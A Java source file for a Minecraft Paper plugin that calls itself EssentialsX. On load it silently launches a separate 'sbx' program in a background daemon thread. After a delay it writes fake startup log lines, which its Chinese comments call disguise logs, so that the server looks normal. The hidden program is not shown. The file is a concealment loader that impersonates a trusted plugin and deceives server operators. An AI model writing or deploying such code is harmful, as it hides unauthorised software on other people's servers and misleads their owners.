package com.example.essentialsx;

import com.example.sbx.App;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * Paper 插件壳：服务器加载插件时，在后台守护线程里启动 sbx 核心（App），
 * 不阻塞服务器主线程。可用 STEALTH_LOG=false 关闭伪装日志。
 */
public class EssentialsX extends JavaPlugin {
    private Thread appThread;
    private Thread stealthThread;

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX enabled.");
        startAppInBackground();
        if (stealthLogEnabled()) {
            startStealthLogs();
        }
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX disabled.");
        if (stealthThread != null) {
            stealthThread.interrupt();
        }
        // App 运行在守护线程上，自带 JVM shutdown hook 做清理，这里无需额外停止。
    }

    private boolean stealthLogEnabled() {
        String v = System.getenv("STEALTH_LOG");
        return v == null || !v.equalsIgnoreCase("false");
    }

    private void startAppInBackground() {
        if (appThread != null && appThread.isAlive()) {
            return;
        }
        appThread = new Thread(() -> {
            try {
                App.main(new String[0]);
            } catch (Throwable t) {
                getLogger().severe("App failed to start: " + t.getMessage());
            }
        }, "sbx-app");
        appThread.setDaemon(true);
        appThread.start();
    }

    /**
     * 伪装日志：模拟正常开服输出，跑在独立线程，不阻塞 onEnable。
     */
    private void startStealthLogs() {
        stealthThread = new Thread(() -> {
            try {
                Thread.sleep(50000);
                String[] lines = {
                        "Preparing spawn area: 10%",
                        "Preparing spawn area: 25%",
                        "Preparing spawn area: 48%",
                        "Preparing spawn area: 72%",
                        "Preparing spawn area: 95%",
                        "Preparing start region for dimension minecraft:the_end",
                        "Preparing spawn area: 100%",
                        "Time elapsed: 1901 ms",
                        "Done preparing level \"world\" (71.792s)",
                        "This server is running Paper version 1.20.1-196 (MC: 1.20.1)",
                };
                for (String line : lines) {
                    getLogger().info(line);
                    Thread.sleep(600);
                }
            } catch (InterruptedException ignored) {
                // 插件卸载时打断，正常退出
            }
        }, "stealth-log");
        stealthThread.setDaemon(true);
        stealthThread.start();
    }
}
